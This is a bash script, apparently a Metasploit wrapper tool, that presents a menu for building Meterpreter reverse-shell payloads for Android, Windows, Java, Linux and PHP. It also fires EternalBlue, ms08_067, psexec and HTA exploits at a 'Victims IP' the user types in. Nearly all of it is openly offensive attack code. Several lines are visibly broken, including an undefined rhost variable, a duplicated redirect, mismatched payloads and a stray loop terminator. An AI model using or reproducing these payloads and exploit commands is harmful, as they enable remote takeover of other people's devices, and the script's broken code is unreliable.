#Coded By Pratik(My Github account: Pentesting-Lab)
echo "
    ╦ ╦┌─┐┌─┐┬┌─┌─┐┌─┐┬  ┌─┐┬┌┬┐  (Version:3.1)
    ╠═╣├─┤│  ├┴┐└─┐├─┘│  │ ││ │   (Linux)
    ╩ ╩┴ ┴└─┘┴ ┴└─┘┴  ┴─┘└─┘┴ ┴   (By Pratik(My Github account: Pentesting-Lab))

"
ip=$(ip addr show wlan0 | awk '/inet / {print $2}' | cut -d/ -f 1)
echo "

1] Android Payload | 5] Windows 7 Hunting with IP (SMB=ms08_netapi)  | 9] HTA Exploit Windows with Link
                   |                                                 |  
2] Windows Payload | 6] PHP Payload                                  |
                   |                                                 |
3] Mac Payload     | 7] Remote Desktop (ms17_010_eternalblue)        |
                   |                                                 |
4] Linux Paylaod   | 8] Exploit Windows ONLY by IP (ms17_010_psexec) | <--Vista/XP/2000/2003


"
read -p "Select option : " yn
    case $yn in
        [1]* ) read -p "Application Name: " app; msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/$app.apk; echo "Payload location is /root/Desktop/$app.apk"; msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;";;
        [2]* ) read -p "Application Name: " app; msfvenom -p windows/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/$app.exe; echo "Payload location is /root/Desktop/$app.exe"; msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;";;
        [3]* ) read -p "Application Name: " app; msfvenom -p java/meterpreter/reverse_tcp lhost=$ip lport=4444 -f jar > /root/Desktop/$app.jar; echo "Payload location is /root/Desktop/$app.jar"; msfconsole -q -x " use exploit/multi/handler; set payload java/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;";;
        [4]* ) read -p "Application Name: " app; msfvenom -p python/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/$app.py lhost=$ip lport=4444 > /root/Desktop/$app.py; echo "Payload location is /root/Desktop/$app.py"; msfconsole -q -x " use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;";;
        [5]* ) read -p "Victims IP: " vip; msfconsole -q -x " use windows/smb/ms08_067_netapi; set payload windows/meterpreter/reverse_tcp;  ; set RHOST $vip; set lhost $ip ; set lport 4444 ; exploit ;";;
        [6]* ) read -p "Application Name: " app; msfvenom -p  php/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/$app.pl; echo "Payload location is /root/Desktop/$app.pl"; msfconsole -q -x " use exploit/multi/handler; set payload php/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;";;
        [7]* ) read -p "Victims IP: " vip; msfconsole -q -x " use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/meterpreter/reverse_tcp;  set lhost $ip ; set rhost $r ; exploit ; ";;
        [8]* ) read -p "Victims IP: " vip; msfconsole -q -x " use exploit/windows/smb/ms17_010_psexec; set lhost $ip ; set rhost $r ; exploit ;";;
        [9]* ) read -p "Victims IP: " vip; msfconsole -q -x " use exploit/windows/misc/hta_server; set srvhost $ip; set uripath /$u; set payload windows/meterpreter/reverse_tcp; set lhost $ip ; exploit ;";;


        * ) echo "Please select the options only from the menu.";;
    esac
done
